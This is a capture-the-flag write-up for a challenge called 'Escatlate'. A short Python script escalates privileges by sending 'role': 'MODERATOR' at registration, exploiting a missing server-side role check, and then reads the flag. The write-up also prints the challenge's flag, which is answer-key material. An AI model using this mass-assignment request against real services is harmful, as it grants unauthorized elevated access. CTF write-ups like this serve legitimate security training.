# 1753 CTF - Escatlate Flag #1

This one is quite straightforward, we can get `MODERATOR` role easily due to the missing role check in server-side.

## Approach

```python
import requests
import random

url = "https://escatlate-52bc47e034fa.1753ctf.com/api/"

rnd = str(random.randint(100000, 999999))
print(rnd)

resp = requests.post(url + "register", json={
    "username": rnd,
    "password": rnd,
    "role": "MODERATOR",
})
print(resp.status_code, resp.text)

token = resp.json()["token"]

resp = requests.get(url + "message", headers={
    "X-Token": token
})
print(resp.text)  # {"message":"Hi Mod! Your flag is 1753c{0h_my_g0d_h0w_c0uld_1_m1ss_thi1_r0l3_ch3ck}"}
```

## Flag

```
1753c{0h_my_g0d_h0w_c0uld_1_m1ss_thi1_r0l3_ch3ck}
```
